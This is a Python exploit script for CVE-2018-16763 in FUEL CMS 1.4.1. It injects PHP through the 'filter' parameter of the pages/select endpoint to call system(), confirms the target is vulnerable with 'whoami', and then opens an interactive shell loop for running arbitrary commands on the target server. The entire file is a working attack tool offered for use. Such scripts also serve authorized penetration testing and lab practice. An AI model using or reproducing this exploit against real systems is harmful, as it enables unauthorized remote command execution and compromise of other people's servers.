#!/usr/bin/env python3
"""
FUEL CMS 1.4.1 - Remote Code Execution (CVE-2018-16763)
Original exploit: searchsploit php/webapps/50477.py

Usage:
    python3 fuel_cms_rce.py -u http://target-ip
"""

import requests
import sys
import argparse
import urllib.parse

def exploit(target_url, command):
    """Execute command via CVE-2018-16763"""

    # URL encode the command
    encoded_cmd = urllib.parse.quote(command)

    # Construct the payload
    payload = f"{target_url}/fuel/pages/select/?filter='+pi(print($a='system'))+$a('{encoded_cmd}')+'"

    try:
        response = requests.get(payload, timeout=10)
        return response.text
    except requests.exceptions.RequestException as e:
        return f"Error: {e}"

def main():
    parser = argparse.ArgumentParser(description='FUEL CMS 1.4.1 RCE Exploit (CVE-2018-16763)')
    parser.add_argument('-u', '--url', required=True, help='Target URL (e.g., http://10.10.10.10)')
    args = parser.parse_args()

    target = args.url.rstrip('/')

    print(f"[+] Target: {target}")
    print("[+] Testing vulnerability...")

    # Test with 'whoami'
    result = exploit(target, "whoami")

    if "www-data" in result or "root" in result:
        print("[+] Target is vulnerable!")
        print(f"[+] whoami: {result.strip()}")
        print("[+] Entering interactive shell (type 'exit' to quit)")

        while True:
            cmd = input("\nfuelcms >> ")
            if cmd.lower() == 'exit':
                break
            output = exploit(target, cmd)
            print(output)
    else:
        print("[-] Target does not appear to be vulnerable")
        sys.exit(1)

if __name__ == "__main__":
    main()
